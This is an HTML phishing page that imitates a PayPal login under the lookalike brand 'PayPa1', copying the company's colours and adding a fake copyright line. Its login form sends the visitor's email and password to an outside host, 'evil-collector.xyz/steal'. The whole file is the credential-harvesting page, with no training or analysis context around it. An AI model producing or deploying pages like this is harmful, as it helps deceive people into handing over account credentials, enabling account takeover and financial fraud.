<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PayPa1 - Secure Login</title>
  <style>
    body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f5f5f5; }
    .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 20px rgba(0,0,0,0.1); width: 340px; }
    h2 { color: #003087; font-size: 1.5rem; margin-bottom: 20px; }
    input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
    button { width: 100%; padding: 12px; background: #0070ba; color: white; border: none; border-radius: 4px; font-size: 1rem; cursor: pointer; margin-top: 10px; }
    .logo { font-size: 2rem; color: #003087; font-weight: bold; margin-bottom: 20px; }
    .logo span { color: #0070ba; }
  </style>
</head>
<body>
  <div class="box">
    <div class="logo">Pay<span>Pa1</span></div>
    <h2>Log in to your account</h2>
    <form action="http://evil-collector.xyz/steal" method="POST">
      <input type="email" placeholder="Email or mobile number" required />
      <input type="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
    <p style="font-size:0.8rem;color:#888;margin-top:15px;">© 2024 PayPa1, Inc. All rights reserved.</p>
  </div>
</body>
</html>
